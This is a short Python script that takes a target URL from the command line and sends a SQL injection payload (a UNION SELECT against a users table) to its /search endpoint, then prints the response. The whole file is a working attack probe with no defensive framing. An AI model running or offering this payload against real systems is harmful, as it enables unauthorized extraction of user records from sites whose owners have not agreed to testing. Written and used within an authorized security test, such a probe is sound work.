import sys
import httpx

base_url = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
response = httpx.get(base_url + "/search", params={"q": "' UNION SELECT * FROM users;--"})
print(response.status_code, response.json())
